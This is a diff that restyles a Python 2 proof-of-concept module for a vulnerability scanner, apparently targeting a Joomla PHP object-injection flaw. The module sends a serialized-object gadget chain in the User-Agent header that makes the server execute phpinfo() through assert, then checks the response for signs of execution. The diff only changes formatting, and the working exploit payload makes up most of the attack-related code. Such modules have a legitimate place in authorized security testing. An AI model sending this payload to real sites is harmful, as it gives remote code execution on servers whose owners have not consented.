@@ -4,7 +4,9 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
-import cookielib,sys
+import cookielib
+import sys
+
 
 class Vuln(ABVuln):
     vuln_id = 'Joomla_0003'  # 平台漏洞编号，留空
@@ -36,20 +38,20 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            cj = cookielib.CookieJar() 
-            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
-            urllib2.install_opener(opener) 
-            urllib2.socket.setdefaulttimeout(10) 
+            cj = cookielib.CookieJar()
+            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+            urllib2.install_opener(opener)
+            urllib2.socket.setdefaulttimeout(10)
 
-            ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86' 
+            ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'
 
-            req = urllib2.Request(url=self.target,headers={'User-Agent':ua})
-            opener.open(req) 
+            req = urllib2.Request(url=self.target, headers={'User-Agent': ua})
+            opener.open(req)
             #req = urllib2.Request(url=self.target)
             #r = opener.open(req).read()
-            #f=open('test.html','a+')
+            # f=open('test.html','a+')
             #print >> f, r
-            #f.close()
+            # f.close()
             if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read() and 'PHP Version' in opener.open(req).read():
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -59,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
